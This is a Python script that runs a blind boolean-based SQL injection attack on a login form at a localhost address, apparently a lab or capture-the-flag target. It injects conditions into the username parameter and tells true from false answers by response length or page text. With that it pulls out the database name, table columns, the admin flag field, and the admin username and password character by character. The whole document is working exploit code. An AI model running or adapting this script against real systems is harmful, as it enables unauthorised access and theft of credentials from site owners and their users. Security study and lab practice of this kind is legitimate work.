import requests
import string

target = "http://127.0.0.1:32895/index.php"

def test_payload(username_payload):
    """Test a payload and return response"""
    params = {'username': username_payload, 'password': 'x'}
    try:
        resp = requests.get(target, params=params, timeout=5)
        return resp.text
    except:
        return ""

print("[*] Testing baseline responses...")

# Test true and false conditions
true_resp = test_payload("admin' AND 1=1-- -")
false_resp = test_payload("admin' AND 1=0-- -")

print(f"TRUE (1=1) response length: {len(true_resp)}")
print(f"FALSE (1=0) response length: {len(false_resp)}")

# Determine how to detect true conditions
if len(true_resp) != len(false_resp):
    print(f"[+] Using response length to detect true/false")
    TRUE_LEN = len(true_resp)
    def is_true(cond):
        r = test_payload(f"admin' AND {cond}-- -")
        return len(r) == TRUE_LEN
elif "not the admin" in true_resp:
    print(f"[+] Using 'not the admin' message to detect true")
    def is_true(cond):
        r = test_payload(f"admin' AND {cond}-- -")
        return "not the admin" in r
else:
    print(f"[-] Cannot determine detection method")
    print(f"True response:\n{true_resp}\n")
    print(f"False response:\n{false_resp}\n")
    exit(1)

# Verify
if is_true("1=1") and not is_true("1=0"):
    print("[+] Detection working!")
else:
    print("[-] Detection not working")
    exit(1)

# Extract database
print("\n[*] Database name:")
db = ""
for i in range(1, 25):
    for c in string.ascii_lowercase + '_':
        if is_true(f"SUBSTR(DATABASE(),{i},1)='{c}'"):
            db += c
            print(f"  {db}")
            break
    else:
        break
print(f"[+] Database: {db}")

# Get first column name
print("\n[*] First column from users table:")
col = ""
for i in range(1, 20):
    for c in string.ascii_lowercase + '_':
        if is_true(f"SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),{i},1)='{c}'"):
            col += c
            print(f"  {col}")
            break
    else:
        break
print(f"[+] Column: {col}")

# Check for admin field
print("\n[*] Checking admin fields:")
admin_field = None
for field in ['is_admin', 'admin', 'isadmin']:
    if is_true(f"(SELECT {field} FROM users WHERE username='admin')=1"):
        admin_field = field
        print(f"[+] Admin field: {field}")
        break

if not admin_field:
    print("[-] No admin field found, trying different approach...")
    # Try to extract first username
    username = ""
    for i in range(1, 30):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_':
            if is_true(f"SUBSTR((SELECT username FROM users LIMIT 0,1),{i},1)='{c}'"):
                username += c
                print(f"  {username}")
                break
        else:
            break
    print(f"[+] First username: {username}")
else:
    # Extract admin username
    print(f"\n[*] Admin username (WHERE {admin_field}=1):")
    username = ""
    for i in range(1, 30):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_':
            if is_true(f"SUBSTR((SELECT username FROM users WHERE {admin_field}=1),{i},1)='{c}'"):
                username += c
                print(f"  {username}")
                break
        else:
            break
    print(f"[+++] Admin username: {username}")
    
    # Extract admin password
    print(f"\n[*] Admin password:")
    password = ""
    for i in range(1, 70):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation:
            if c == "'":
                if is_true(f"SUBSTR((SELECT password FROM users WHERE {admin_field}=1),{i},1)=CHAR(39)"):
                    password += c
                    print(f"  {password}")
                    break
            else:
                if is_true(f"SUBSTR((SELECT password FROM users WHERE {admin_field}=1),{i},1)='{c}'"):
                    password += c
                    print(f"  {password}")
                    break
        else:
            break
    print(f"[+++] Admin password: {password}")

print("\n[*] Complete!")

